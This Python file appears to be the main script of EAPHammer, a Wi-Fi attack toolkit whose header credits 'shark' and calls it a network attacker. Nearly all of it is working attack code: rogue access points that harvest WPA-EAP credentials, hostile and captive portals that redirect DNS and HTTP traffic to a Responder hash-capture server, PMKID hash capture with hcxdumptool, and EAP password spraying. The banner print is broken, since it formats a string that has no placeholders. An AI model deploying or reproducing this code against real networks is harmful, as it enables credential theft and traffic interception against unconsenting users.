# <3 - shark

# EAP-Hammer is a network attacker made by shark on 5/24/2020 at 2:33 am

import argparse
import cert_wizard
import core.cli
import core.eap_spray
import datetime
import json
import os
import signal
import subprocess
import sys
import time

from argparse import ArgumentParser
from core import conf_manager, utils, responder, services
from core.autocrack import Autocrack
from core import iw_parse
from core.hostapd import HostapdEaphammer
from core.hostapd_config import HostapdConfig
from core.eap_user_file import EAPUserFile
from core.hostapd_mac_acl import HostapdMACACL
from core.hostapd_ssid_acl import HostapdSSIDACL
from core.known_ssids_file import KnownSSIDSFile
from core.responder_config import ResponderConfig
from core.lazy_file_reader import LazyFileReader
from core.redirect_server import RedirectServer
from core.wpa_supplicant import WPA_Supplicant
from core.wpa_supplicant_conf import WPASupplicantConf
from datetime import datetime
from multiprocessing import Queue
from settings import settings
from __version__ import __version__, __tagline__, __author__, __contact__, __codename__
from threading import Thread

def hostile_portal():
    global responder

    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    if options['manual_config'] is None:
        interface = core.interface.Interface(options['interface'])
    else:
        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])
        interface = core.interface.Interface(interface_name)
    use_pivot = options['pivot']
    save_config = options['save_config']

    try:
        utils.Iptables.save_rules()
    
        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()
            time.sleep(4)

        # prepare environment
        interface.nm_off()
        utils.set_ipforward(1)

        if options['auth'] == 'wpa-eap':

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # configure routing 
        interface.set_ip_and_netmask('10.0.0.1', '255.255.255.0')
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

        # configure dnsmasq
        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=str(interface))
        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])

        # start RedirectServer
        rs = RedirectServer.get_instance()
        rs.configure('10.0.0.1')
        rs.start()

        # start Responder
        if use_pivot:

            print('[*] Pivot mode activated. Rogue SMB server disabled.')
            print ('[*] Run payload_generator to '
                        'generate a timed payload if desired.')

            settings.dict['core']['responder']['Responder Core']['SMB'] = 'Off'

        else:

            settings.dict['core']['responder']['Responder Core']['SMB'] = 'On'


        responder_conf = ResponderConfig(settings, options)
        responder_conf.write()

        resp = responder.Responder.get_instance()
        resp.start(str(interface))

        # set iptables policy, flush all tables for good measure
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
        utils.Iptables.route_dns2_addr('10.0.0.1', interface)
        utils.Iptables.route_http2_addr('10.0.0.1', interface)

        # pause execution until user quits
        input('\n\nPress enter to quit...\n\n')

        resp.stop()

        hostapd.stop()
        services.Dnsmasq.kill()
        rs.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()


    except KeyboardInterrupt:

        resp.stop()
    
        hostapd.stop()
        services.Dnsmasq.kill()
        rs.stop()
        resp.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

def captive_portal():

    if options['manual_config'] is None:
        interface = core.interface.Interface(options['interface'])
    else:
        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])
        interface = core.interface.Interface(interface_name)
    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    save_config = options['save_config']

    try:

        utils.Iptables.save_rules()

        # prepare environment
        utils.set_ipforward(1)
        interface.nm_off()

        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()

        if options['auth'] == 'wpa-eap':

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # configure routing 
        interface.set_ip_and_netmask('10.0.0.1', '255.255.255.0')
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

        # configure dnsmasq
        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=str(interface))
        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])

        # start httpd
        services.Httpd.start()

        # set iptables policy, flush all tables for good measure
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
        utils.Iptables.route_dns2_addr('10.0.0.1', interface)
        utils.Iptables.route_http2_addr('10.0.0.1', interface)
        
        # pause execution until user quits
        input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        services.Dnsmasq.kill()
        services.Httpd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

    except KeyboardInterrupt:

        hostapd.stop()
        services.Dnsmasq.kill()
        services.Httpd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

def troll_defender():

    interface = core.interface.Interface(options['interface'])

    try:

        utils.Iptables.save_rules()

        interface.nm_off()

        options['essid'] = 'C:\\Temp\\Invoke-Mimikatz.ps1'

        if options['auth'] == 'wpa-eap':

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # pause execution until user quits  
        input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

    except KeyboardInterrupt:

        hostapd.stop()

        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

def reap_creds():

    if options['manual_config'] is None:
        interface = core.interface.Interface(options['interface'])
    else:
        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])
        interface = core.interface.Interface(interface_name)
    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    save_config = options['save_config']

    try:

        utils.Iptables.save_rules()

        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()

        interface.nm_off()

        if options['auth'] == 'wpa-eap' or (options['reap_creds'] and options['auth'] is None):

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # pause execution until user quits  
        input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

    except KeyboardInterrupt:

        hostapd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

def pmkid_attack():

    bssid = options['bssid']
    channel = options['channel']
    essid = options['essid']
    interface = core.interface.Interface(options['interface'])
    hcxpcaptool = settings.dict['paths']['hcxtools']['hcxpcaptool']['bin']
    hcxdumptool = settings.dict['paths']['hcxdumptool']['bin']
    hcxpcaptool_ofile = settings.dict['paths']['hcxtools']['hcxpcaptool']['ofile']
    hcxdumptool_ofile = settings.dict['paths']['hcxdumptool']['ofile']
    hcxdumptool_filter = settings.dict['paths']['hcxdumptool']['filter']
    loot_dir = settings.dict['paths']['directories']['loot']

    interface.down()
    interface.nm_off()
    interface.mode_managed()
    interface.up()

    print('[*] Scanning for nearby access points...')
    networks = iw_parse.iw_parse.get_interfaces(interface=str(interface))
    print('[*] Complete!')
    time.sleep(.5)

    interface.down()
    interface.mode_monitor()
    interface.up()

    if bssid is not None:

        if channel is None:
            print('[*] No channel specified... finding appropriate channel...')
            channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
            if channel is None:
                print('[!] Target network not found... aborting...')
                sys.exit()
            print('[*] Channel %d selected...' % channel)
            print('[*] Complete!')
        
        essid = iw_parse.helper_functions.find_essid_from_bssid(bssid, networks)
        if essid is None:
            print('[!] Target network is hidden...')
            essid = ''
    
    elif essid is not None:

        print('[*] No bssid or channel specified...')
        print('[*] ... searching for AP that has ESSID %s...' % essid)
        bssid = iw_parse.helper_functions.find_bssid_from_essid(essid, networks)
        if bssid is None:
            print('[!] Target network not found... aborting...')
            sys.exit()
        print('[*] BSSID %s selected...' % bssid)
        channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
        if channel is None:
            print('[!] Target network not found... aborting...')
            sys.exit()
        print('[*] Channel %d selected...' % channel)
        print('[*] Complete!')
    
    else:
        raise Exception('BSSID or ESSID must be specified')

    print('[*] Creating filter file for target...')
    with open(hcxdumptool_filter, 'w') as fd:
        fd.write('%s' % bssid.replace(':', ''))
    print('[*] Complete!')

    print('[*] Running hcxdumptool...')
    p = subprocess.Popen('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter), shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    while True:
        line = p.stdout.readline()
        print(line, end=' ')
        if 'FOUND PMKID CLIENT-LESS]' in line:
            break
    os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    print('[*] Complete!')

    print('[*] Extracting hash from pcap file using hcxpcaptool...')
    os.system('%s -z %s %s' % (hcxpcaptool, hcxpcaptool_ofile, hcxdumptool_ofile))
    with open(hcxpcaptool_ofile) as fd:
        hash_str = fd.read()
        print('\thashcat format:', hash_str)
    print('[*] Complete!')

    save_file = os.path.join(loot_dir, '-'.join([
            essid,
            bssid,
            datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S'),
            'PMKID.txt',
    ]))
    
    print('[*] Saving hash to %s' % save_file)
    with open(save_file, 'w') as fd:
        fd.write(hash_str)
    print('[*] Complete!')

    print('[*] Removing temporary files...')
    try:
        os.remove(hcxpcaptool_ofile)
    except OSError as e:
        print("Error: %s - %s" % (e.filename, e.strerror))
    try:
        os.remove(hcxdumptool_filter)
    except OSError as e:
        print("Error: %s - %s" % (e.filename, e.strerror))
    try:
        os.remove(hcxdumptool_ofile)
    except OSError as e:
        print("Error: %s - %s" % (e.filename, e.strerror))
    print('[*] Complete!')

def eap_spray():

    # set variables from settings / options
    interfaces = options['interface_pool']
    essid = options['essid']
    password = options['password']
    input_file = options['user_list']
    output_file = settings.dict['paths']['eap_spray']['log']
    conf_dir = settings.dict['paths']['directories']['tmp']

    # instantiate pipelines
    input_queue = Queue()
    output_queue = Queue(maxsize=(len(interfaces) * 5))

    # instantiate workers
    producer = core.eap_spray.Producer(input_file, input_queue, len(interfaces))
    cred_logger = core.eap_spray.Cred_Logger(output_file, output_queue)
    worker_pool = core.eap_spray.Worker_Pool(interfaces, essid, password, input_queue, output_queue, conf_dir)

    # start everything (order matters)
    worker_pool.start()
    cred_logger.start()
    producer.run()

    # when producer reaches end of user_list file, everything else should
    # terminate
    worker_pool.join()
    cred_logger.join()

def save_config_only():

    hostapd_conf = HostapdConfig(settings, options)
    hostapd_conf.write()
    hostapd_conf.save()
    hostapd_conf.remove()

def run_cert_wizard():

    if options['cert_wizard'] == 'import':
       
        cert_wizard.import_cert(options['server_cert'],
                    private_key_path=options['private_key'],
                    ca_cert_path=options['ca_cert'],
                    passwd=options['private_key_passwd'],
        )

    elif options['cert_wizard'] == 'create' or options['bootstrap']:

        if options['self_signed'] or options['bootstrap']:
            
            cert_wizard.bootstrap(options['cn'],
                                country=options['country'],
                                state_province=options['state'],
                                city=options['locale'],
                                organization=options['org'],
                                org_unit=options['org_unit'],
                                email_address=options['email'],
                                not_before=options['not_before'],
                                not_after=options['not_after'],
                                algorithm=options['algorithm'],
                                key_length=options['key_length'],
            )

        else:

            cert_wizard.create_server_cert(options['ca_cert'],
                            options['cn'],
                            signing_key_path=options['ca_key'],
                            signing_key_passwd=options['ca_key_passwd'],
                            country=options['country'],
                            state_province=options['state'],
                            city=options['locale'],
                            organization=options['org'],
                            org_unit=options['org_unit'],
                            email_address=options['email'],
                            not_before=options['not_before'],
                            not_after=options['not_after'],
                            algorithm=options['algorithm'],
                            key_length=options['key_length'],
            )

    elif options['cert_wizard'] == 'interactive':

            cert_wizard.interactive()

    elif options['cert_wizard'] == 'list':

            cert_wizard.list_certs()

    elif options['cert_wizard'] == 'dh':

            cert_wizard.rebuild_dh_file(options['key_length'])

    else:

        raise Exception('Invalid argument passed to --cert-wizard')
            
def am_i_rooot():

    print('[?] Am I root?')

    print('[*] Checking for rootness...')
    if not os.geteuid()==0:
        print('[!] not root, just really drunk.')
        sys.exit('[!] EAPHammer must be run as root: aborting.')

    print('[*] I AM ROOOOOOOOOOOOT')

    print('[*] Root privs confirmed! 8D')

def print_banner():


    print(''' Cupids Network Attacker

    ''' % (__tagline__, __version__, __codename__, __author__, __contact__))

if __name__ == '__main__':

    print_banner()

    options = core.cli.set_options()

    am_i_rooot()

    if options['debug']:
        print('[debug] Settings:')
        print(json.dumps(settings.dict, indent=4, sort_keys=True))
        print('[debug] Options:')
        print(json.dumps(options, indent=4, sort_keys=True))

    if options['cert_wizard'] or options['bootstrap']:
        run_cert_wizard()
    elif options['save_config_only']:
        save_config_only()        
    elif options['captive_portal']:
        captive_portal()
    elif options['hostile_portal']:
        hostile_portal()
    elif options['pmkid']:
        pmkid_attack()
    elif options['eap_spray']:
        eap_spray()
    elif options['troll_defender']:
        troll_defender()
    else:
        reap_creds()

